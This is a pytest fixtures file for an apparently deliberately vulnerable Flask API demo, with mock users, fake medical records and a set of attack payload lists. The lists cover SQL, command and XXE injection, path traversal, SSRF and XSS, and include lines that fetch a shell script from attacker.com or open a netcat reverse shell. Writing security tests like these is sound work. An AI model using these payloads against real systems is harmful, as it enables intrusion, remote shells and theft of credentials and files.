"""
Pytest configuration and shared fixtures for api-demo tests.
"""

import sys
from pathlib import Path
import pytest

# Add app directory to Python path
app_dir = Path(__file__).parent.parent
sys.path.insert(0, str(app_dir))

from app import create_app
from app.models import (
    users_db, add_user, username_to_id_map, email_to_id_map,
    medical_records_db, claims_db,
    accounts_db, transactions_db, password_reset_requests,
    refresh_tokens_db, mfa_challenges_db, registered_devices_db,
    api_keys_db, customers_db, policies_db, claims_evidence_db,
    underwriting_rules_db, actuarial_models_db,
    saas_tenants_db, saas_projects_db, saas_users_db, saas_shared_links_db,
    saas_users_by_tenant,
    saas_billing_invoices_db, saas_billing_usage_db, saas_workspace_settings_db,
    saas_coupons_db, saas_refresh_tokens_db, saas_audit_logs_db,
    gov_cases_db, gov_records_db, gov_users_db, gov_access_cards_db,
    gov_service_requests_db, gov_audit_logs_db, gov_credentials_db,
    gov_benefits_applications_db, gov_classifications_db, gov_permits_db,
    telecom_subscribers_db, telecom_sim_swaps_db, telecom_plan_changes_db,
    telecom_network_towers_db, telecom_provisioning_db, telecom_throttle_events_db,
    telecom_cdr_exports_db, telecom_invoices_db, telecom_billing_adjustments_db,
    telecom_payment_methods_db, telecom_refunds_db, telecom_porting_requests_db,
    telecom_api_keys_db, telecom_webhooks_db, telecom_cdr_streams_db,
    telecom_device_activations_db,
    energy_dispatch_db, energy_load_shed_db, energy_breakers_db, energy_outages_db,
    energy_outage_dispatches_db, energy_outage_restores_db, energy_meter_readings_db,
    energy_meter_disconnects_db, energy_meter_firmware_db, energy_billing_adjustments_db,
    energy_autopay_db, energy_refunds_db, energy_customers_db,
    energy_asset_maintenance_db, energy_asset_calibration_db, energy_assets_db,
    banking_wire_transfers_db, banking_beneficiaries_db, banking_kyc_documents_db,
    ecommerce_gift_cards_db, ecommerce_order_exports_db,
    saas_org_invites_db, saas_saml_configs_db, saas_session_revocations_db,
    telecom_device_bindings_db, telecom_imei_blacklist_db, telecom_roaming_overrides_db,
    energy_demand_response_db, energy_tariff_overrides_db, energy_der_interconnections_db
)

# Handle user_sessions gracefully if it exists
try:
    from app.models import user_sessions
except ImportError:
    user_sessions = {}


@pytest.fixture
def app():
    """Create Flask application for testing."""
    app = create_app()
    app.config.update({
        "TESTING": True,
    })
    yield app


@pytest.fixture
def client(app):
    """Create test client."""
    return app.test_client()


@pytest.fixture
def runner(app):
    """Create CLI runner."""
    return app.test_cli_runner()


@pytest.fixture(autouse=True)
def reset_databases():
    """Reset all in-memory databases before each test."""
    users_db.clear()
    username_to_id_map.clear()
    email_to_id_map.clear()
    medical_records_db.clear()
    claims_db.clear()
    accounts_db.clear()
    transactions_db.clear()
    password_reset_requests.clear()
    refresh_tokens_db.clear()
    mfa_challenges_db.clear()
    registered_devices_db.clear()
    api_keys_db.clear()
    customers_db.clear()
    policies_db.clear()
    claims_evidence_db.clear()
    underwriting_rules_db.clear()
    actuarial_models_db.clear()
    saas_tenants_db.clear()
    saas_projects_db.clear()
    saas_users_db.clear()
    saas_users_by_tenant.clear()
    saas_shared_links_db.clear()
    saas_billing_invoices_db.clear()
    saas_billing_usage_db.clear()
    saas_workspace_settings_db.clear()
    saas_coupons_db.clear()
    saas_refresh_tokens_db.clear()
    saas_audit_logs_db.clear()
    gov_cases_db.clear()
    gov_records_db.clear()
    gov_users_db.clear()
    gov_access_cards_db.clear()
    gov_service_requests_db.clear()
    gov_audit_logs_db.clear()
    gov_credentials_db.clear()
    gov_benefits_applications_db.clear()
    gov_classifications_db.clear()
    gov_permits_db.clear()
    telecom_subscribers_db.clear()
    telecom_sim_swaps_db.clear()
    telecom_plan_changes_db.clear()
    telecom_network_towers_db.clear()
    telecom_provisioning_db.clear()
    telecom_throttle_events_db.clear()
    telecom_cdr_exports_db.clear()
    telecom_invoices_db.clear()
    telecom_billing_adjustments_db.clear()
    telecom_payment_methods_db.clear()
    telecom_refunds_db.clear()
    telecom_porting_requests_db.clear()
    telecom_api_keys_db.clear()
    telecom_webhooks_db.clear()
    telecom_cdr_streams_db.clear()
    telecom_device_activations_db.clear()
    energy_dispatch_db.clear()
    energy_load_shed_db.clear()
    energy_breakers_db.clear()
    energy_outages_db.clear()
    energy_outage_dispatches_db.clear()
    energy_outage_restores_db.clear()
    energy_meter_readings_db.clear()
    energy_meter_disconnects_db.clear()
    energy_meter_firmware_db.clear()
    energy_billing_adjustments_db.clear()
    energy_autopay_db.clear()
    energy_refunds_db.clear()
    energy_customers_db.clear()
    energy_asset_maintenance_db.clear()
    energy_asset_calibration_db.clear()
    energy_assets_db.clear()
    banking_wire_transfers_db.clear()
    banking_beneficiaries_db.clear()
    banking_kyc_documents_db.clear()
    ecommerce_gift_cards_db.clear()
    ecommerce_order_exports_db.clear()
    saas_org_invites_db.clear()
    saas_saml_configs_db.clear()
    saas_session_revocations_db.clear()
    telecom_device_bindings_db.clear()
    telecom_imei_blacklist_db.clear()
    telecom_roaming_overrides_db.clear()
    energy_demand_response_db.clear()
    energy_tariff_overrides_db.clear()
    energy_der_interconnections_db.clear()
    if user_sessions:
        user_sessions.clear()
    yield
    # Cleanup after test
    users_db.clear()
    username_to_id_map.clear()
    email_to_id_map.clear()
    medical_records_db.clear()
    claims_db.clear()
    accounts_db.clear()
    transactions_db.clear()
    password_reset_requests.clear()
    refresh_tokens_db.clear()
    mfa_challenges_db.clear()
    registered_devices_db.clear()
    api_keys_db.clear()
    customers_db.clear()
    policies_db.clear()
    claims_evidence_db.clear()
    underwriting_rules_db.clear()
    actuarial_models_db.clear()
    saas_tenants_db.clear()
    saas_projects_db.clear()
    saas_users_db.clear()
    saas_shared_links_db.clear()
    saas_billing_invoices_db.clear()
    saas_billing_usage_db.clear()
    saas_workspace_settings_db.clear()
    saas_coupons_db.clear()
    saas_refresh_tokens_db.clear()
    saas_audit_logs_db.clear()
    gov_cases_db.clear()
    gov_records_db.clear()
    gov_users_db.clear()
    gov_access_cards_db.clear()
    gov_service_requests_db.clear()
    gov_audit_logs_db.clear()
    gov_credentials_db.clear()
    gov_benefits_applications_db.clear()
    gov_classifications_db.clear()
    gov_permits_db.clear()
    telecom_subscribers_db.clear()
    telecom_sim_swaps_db.clear()
    telecom_plan_changes_db.clear()
    telecom_network_towers_db.clear()
    telecom_provisioning_db.clear()
    telecom_throttle_events_db.clear()
    telecom_cdr_exports_db.clear()
    telecom_invoices_db.clear()
    telecom_billing_adjustments_db.clear()
    telecom_payment_methods_db.clear()
    telecom_refunds_db.clear()
    telecom_porting_requests_db.clear()
    telecom_api_keys_db.clear()
    telecom_webhooks_db.clear()
    telecom_cdr_streams_db.clear()
    telecom_device_activations_db.clear()
    energy_dispatch_db.clear()
    energy_load_shed_db.clear()
    energy_breakers_db.clear()
    energy_outages_db.clear()
    energy_outage_dispatches_db.clear()
    energy_outage_restores_db.clear()
    energy_meter_readings_db.clear()
    energy_meter_disconnects_db.clear()
    energy_meter_firmware_db.clear()
    energy_billing_adjustments_db.clear()
    energy_autopay_db.clear()
    energy_refunds_db.clear()
    energy_customers_db.clear()
    energy_asset_maintenance_db.clear()
    energy_asset_calibration_db.clear()
    energy_assets_db.clear()
    banking_wire_transfers_db.clear()
    banking_beneficiaries_db.clear()
    banking_kyc_documents_db.clear()
    ecommerce_gift_cards_db.clear()
    ecommerce_order_exports_db.clear()
    saas_org_invites_db.clear()
    saas_saml_configs_db.clear()
    saas_session_revocations_db.clear()
    telecom_device_bindings_db.clear()
    telecom_imei_blacklist_db.clear()
    telecom_roaming_overrides_db.clear()
    energy_demand_response_db.clear()
    energy_tariff_overrides_db.clear()
    energy_der_interconnections_db.clear()
    if user_sessions:
        user_sessions.clear()


@pytest.fixture
def mock_users():
    """Create mock users in database."""
    add_user('USR-0001', {
        'user_id': 'USR-0001',
        'username': 'admin',
        'email': 'admin@example.com',
        'role': 'admin',
        'status': 'active',
        'password_hash': 'md5:5f4dcc3b5aa765d61d8327deb882cf99',
        'created_at': '2025-01-01',
        'last_login': '2025-10-01',
        'api_key': 'sk-admin-key-12345'
    })
    add_user('USR-0002', {
        'user_id': 'USR-0002',
        'username': 'john.smith',
        'email': 'john.smith@example.com',
        'role': 'user',
        'status': 'active',
        'password_hash': 'md5:098f6bcd4621d373cade4e832627b4f6',
        'created_at': '2025-01-15',
        'last_login': '2025-10-10',
        'api_key': 'sk-user-key-67890'
    })
    return users_db


@pytest.fixture
def mock_medical_records():
    """Create mock medical records in database."""
    medical_records_db['REC-001'] = {
        'record_id': 'REC-001',
        'patient_id': 'PAT-1001',
        'patient_name': 'John Doe',
        'ssn': '123-45-6789',
        'dob': '1980-05-15',
        'diagnosis': 'Type 2 Diabetes',
        'medications': ['Metformin 500mg', 'Lisinopril 10mg'],
        'last_visit': '2025-09-15',
        'provider_id': 'PROV-501',
        'allergies': ['Penicillin'],
        'conditions': ['Hypertension', 'Type 2 Diabetes'],
        'insurance_id': 'INS-555123'
    }
    medical_records_db['REC-002'] = {
        'record_id': 'REC-002',
        'patient_id': 'PAT-1002',
        'patient_name': 'Jane Smith',
        'ssn': '987-65-4321',
        'dob': '1975-08-20',
        'diagnosis': 'Anxiety Disorder',
        'medications': ['Sertraline 50mg'],
        'last_visit': '2025-09-20',
        'provider_id': 'PROV-502',
        'allergies': ['Sulfa drugs'],
        'conditions': ['Generalized Anxiety Disorder'],
        'insurance_id': 'INS-555124'
    }
    return medical_records_db


@pytest.fixture
def mock_claims():
    """Create mock insurance claims in database."""
    claims_db['CLM-001'] = {
        'claim_id': 'CLM-001',
        'policy_number': 'HI123456789',
        'patient_id': 'PAT-1001',
        'provider_id': 'PROV-501',
        'service_date': '2025-09-15',
        'diagnosis_codes': ['E11.9'],
        'procedure_codes': ['99213'],
        'billed_amount': 250,
        'status': 'approved',
        'submitted_date': '2025-09-16T10:30:00'
    }
    return claims_db


# ============================================================================
# Attack Payload Fixtures
# ============================================================================

@pytest.fixture
def sql_injection_payloads():
    """SQL injection attack payloads."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "1' OR '1'='1' --",
        "' OR 1=1--",
        "'; SELECT * FROM medical_records--"
    ]


@pytest.fixture
def command_injection_payloads():
    """Command injection attack payloads."""
    return [
        "; cat /etc/passwd",
        "| ls -la /",
        "&& whoami",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; curl http://attacker.com/shell.sh | sh",
        "| nc -e /bin/sh attacker.com 4444"
    ]


@pytest.fixture
def path_traversal_payloads():
    """Path traversal attack payloads."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "../../config/database.yml",
        "../.env",
        "../../secrets.json"
    ]


@pytest.fixture
def xxe_injection_payloads():
    """XXE injection attack payloads."""
    return [
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
]>
<foo>&xxe;</foo>""",
        """<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY bar SYSTEM "file:///etc/shadow" >]>
<foo>&bar;</foo>"""
    ]


@pytest.fixture
def ssrf_payloads():
    """SSRF attack payloads."""
    return [
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.5:3306",
        "http://192.168.1.1/admin",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://[::1]:8080"
    ]


@pytest.fixture
def deserialization_payloads():
    """Insecure deserialization payloads."""
    import base64

    # Mock pickle payload (base64 encoded)
    payloads = [
        base64.b64encode(b'pickle_payload_with___reduce__').decode(),
        base64.b64encode(b'malicious___setstate__payload').decode(),
        base64.b64encode(b'pickle.loads() RCE payload').decode()
    ]
    return payloads


# ============================================================================
# Authorization Test Fixtures
# ============================================================================

@pytest.fixture
def unauthorized_headers():
    """Headers for unauthorized requests."""
    return {
        'Content-Type': 'application/json'
    }


@pytest.fixture
def admin_headers():
    """Headers for admin requests."""
    return {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer admin-token-12345',
        'X-User-Role': 'admin'
    }


@pytest.fixture
def user_headers():
    """Headers for regular user requests."""
    return {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer user-token-67890',
        'X-User-Role': 'user'
    }


# ============================================================================
# Test Data Generators
# ============================================================================

@pytest.fixture
def generate_phi_data():
    """Generate realistic PHI data for testing."""
    def _generate(count=1):
        import random
        from datetime import datetime, timedelta

        records = []
        for i in range(count):
            records.append({
                'patient_id': f'PAT-{1000 + i}',
                'patient_name': f'Patient {i}',
                'ssn': f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}',
                'dob': (datetime.now() - timedelta(days=random.randint(18*365, 80*365))).strftime('%Y-%m-%d'),
                'diagnosis': random.choice(['Diabetes', 'Hypertension', 'Anxiety', 'Depression']),
                'medications': [f'Medication-{random.randint(1,100)}'],
                'insurance_id': f'INS-{random.randint(100000,999999)}'
            })
        return records
    return _generate


@pytest.fixture
def generate_attack_patterns():
    """Generate common attack patterns for testing."""
    return {
        'sqli': [
            "' OR '1'='1",
            "'; DROP TABLE--",
            "UNION SELECT"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>"
        ],
        'cmdi': [
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la"
        ],
        'lfi': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "file:///etc/passwd"
        ]
    }


# ============================================================================
# Auth-Specific Test Fixtures
# ============================================================================

@pytest.fixture
def sample_user():
    """Create a sample user for authentication tests."""
    import hashlib
    import uuid
    from datetime import datetime

    user_id = str(uuid.uuid4())
    password = "SecurePassword123!"
    password_hash = hashlib.sha256(password.encode()).hexdigest()

    user_data = {
        'user_id': user_id,
        'username': 'testuser',
        'email': 'test@example.com',
        'password_hash': password_hash,
        'name': 'Test User',
        'role': 'user',
        'created_at': datetime.utcnow().isoformat(),
        'mfa_enabled': False,
        'verified': True
    }

    add_user(user_id, user_data)

    return {
        'user_id': user_id,
        'username': 'testuser',
        'email': 'test@example.com',
        'password': password,
        'password_hash': password_hash,
        'data': user_data
    }


@pytest.fixture
def mfa_user():
    """Create a user with MFA enabled."""
    import hashlib
    import uuid
    import secrets
    from datetime import datetime

    user_id = str(uuid.uuid4())
    password = "SecurePassword123!"
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    totp_secret = secrets.token_hex(16)

    user_data = {
        'user_id': user_id,
        'username': 'mfauser',
        'email': 'mfa@example.com',
        'password_hash': password_hash,
        'name': 'MFA User',
        'role': 'user',
        'created_at': datetime.utcnow().isoformat(),
        'mfa_enabled': True,
        'mfa_method': 'totp',
        'mfa_secret': totp_secret,
        'verified': True
    }

    add_user(user_id, user_data)

    return {
        'user_id': user_id,
        'username': 'mfauser',
        'email': 'mfa@example.com',
        'password': password,
        'password_hash': password_hash,
        'mfa_secret': totp_secret,
        'data': user_data
    }


@pytest.fixture
def authenticated_session(client, sample_user):
    """Create an authenticated session."""
    import uuid
    with client.session_transaction() as sess:
        sess['user_id'] = sample_user['user_id']
        sess['username'] = sample_user['username']
        sess['session_id'] = str(uuid.uuid4())
    return sample_user


@pytest.fixture
def valid_reset_token(sample_user):
    """Create a valid password reset token."""
    import secrets
    from datetime import datetime, timedelta

    reset_token = secrets.token_urlsafe(32)
    password_reset_requests[reset_token] = {
        'user_id': sample_user['user_id'],
        'email': sample_user['email'],
        'created_at': datetime.utcnow().isoformat(),
        'expires_at': (datetime.utcnow() + timedelta(hours=1)).isoformat(),
        'used': False
    }
    return reset_token


@pytest.fixture
def valid_refresh_token(sample_user):
    """Create a valid refresh token."""
    import secrets
    from datetime import datetime, timedelta

    refresh_token = secrets.token_urlsafe(32)
    refresh_tokens_db[refresh_token] = {
        'user_id': sample_user['user_id'],
        'created_at': datetime.utcnow().isoformat(),
        'expires_at': (datetime.utcnow() + timedelta(days=30)).isoformat(),
        'token': refresh_token
    }
    return refresh_token


@pytest.fixture
def mfa_challenge(mfa_user):
    """Create an MFA challenge."""
    import uuid
    from datetime import datetime

    challenge_id = str(uuid.uuid4())
    mfa_challenges_db[challenge_id] = {
        'user_id': mfa_user['user_id'],
        'created_at': datetime.utcnow().isoformat(),
        'code': '123456',
        'attempts': 0
    }
    return {
        'challenge_id': challenge_id,
        'code': '123456',
        'user': mfa_user
    }


@pytest.fixture
def demo_mode_full(monkeypatch):
    """Set DEMO_MODE to 'full' for vulnerability testing."""
    monkeypatch.setenv('DEMO_MODE', 'full')


@pytest.fixture
def demo_mode_strict(monkeypatch):
    """Set DEMO_MODE to 'strict' for secure mode testing."""
    monkeypatch.setenv('DEMO_MODE', 'strict')
